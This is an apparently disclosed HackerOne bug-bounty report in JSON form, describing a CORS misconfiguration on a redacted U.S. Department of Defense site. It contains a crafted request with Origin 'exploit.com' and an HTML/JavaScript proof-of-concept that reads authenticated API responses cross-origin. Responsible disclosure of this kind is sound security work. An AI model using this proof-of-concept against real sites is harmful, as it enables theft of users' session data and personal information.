{
  "id": 470298,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NzAyOTg=",
  "url": "https://hackerone.com/reports/470298",
  "title": "[██████] Cross-origin resource sharing misconfiguration (CORS)",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2018-12-20T15:15:12.102Z",
  "submitted_at": "2018-12-20T15:15:12.102Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "jarvis0x1",
    "url": "/jarvis0x1",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/074/981/b2ac207af259985cde15c3291f708ea28bdbe37a_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 16064,
    "url": "https://hackerone.com/deptofdefense",
    "handle": "deptofdefense",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "U.S. Dept Of Defense",
      "twitter_handle": "DC3VDP",
      "website": "https://bit.ly/3ntULtN",
      "about": ""
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2019-01-28T13:31:46.124Z",
  "bug_reporter_agreed_on_going_public_at": "2019-01-17T01:29:45.077Z",
  "team_member_agreed_on_going_public_at": "2019-01-28T13:31:46.039Z",
  "comments_closed?": true,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi!\n\nIn this report I want to describe High level bug which can seriously compromise a user account.\n\nIf I am authorize on this site, I can steal user's sessions, some personal information or do some action.\n\n### Steps for reproduce\n\n1) Send this request\n\n```\nGET /api/jsonws/relo-service-plugin-portlet.content/get-content-by-slug/slug/page-ex-link HTTP/1.1\nHost: www.█████\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: ru,en-US;q=0.7,en;q=0.3\nAccept-Encoding: gzip, deflate\nOrigin: exploit.com\nConnection: close\nUpgrade-Insecure-Requests: 1\nCache-Control: max-age=0\n```\n\nIn response headers you can see headers\n```\nAccess-Control-Allow-Credentials: true\nAccess-Control-Allow-Origin: exploit.com\n```\n\n{F395049}\n\n\nSo you can write exploit:\n```\n<!DOCTYPE html>\n<html>\n   <head>\n      <script>\n         function cors() {\n\t        var xhttp = new XMLHttpRequest();\n\t\t        xhttp.onreadystatechange = function() {\n\t\t\t        if (this.readyState == 4 && this.status == 200) {\n\t\t\t        \tdocument.getElementById(\"emo\").innerHTML = alert(this.responseText);\n\t        }\n         };\n         xhttp.open(\"GET\", \"https://www.███/api/jsonws/relo-service-plugin-portlet.content/get-content-by-slug/slug/page-ex-link\", true);\n         xhttp.withCredentials = true;\n         xhttp.send();\n         }\n      </script>\n   </head>\n   <body>\n      <center>\n      <h2>CORS PoC Exploit </h2>\n      <h3>created by <a href=\"https://twitter.com/Jarvis7717\">@Jarvis</a></h3>\n      <h3>Show full content of page</h3>\n      <div id=\"demo\">\n         <button type=\"button\" onclick=\"cors()\">Exploit</button>\n      </div>\n   </body>\n</html>\n```\n\nResult:\n{F395063}\n### How to fix\n\nRather than using a wild card or programmatically verifying supplied origins, use a white list of trusted domains.\n\n## Impact\n\nAttacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server. Attacker can perform any action in the user's account, bypassing CSRF tokes.",
  "weakness": {
    "id": 26,
    "name": "Improper Access Control - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 30,
  "voters": [
    "mainteemoforfun",
    "afernandes",
    "lemonoftroy",
    "sameerphad72",
    "dnelsaka",
    "mik317",
    "jarvis0x1",
    "chita",
    "savitar0x01",
    "haxta4ok00",
    "and 20 more..."
  ],
  "severity": {
    "rating": "high",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
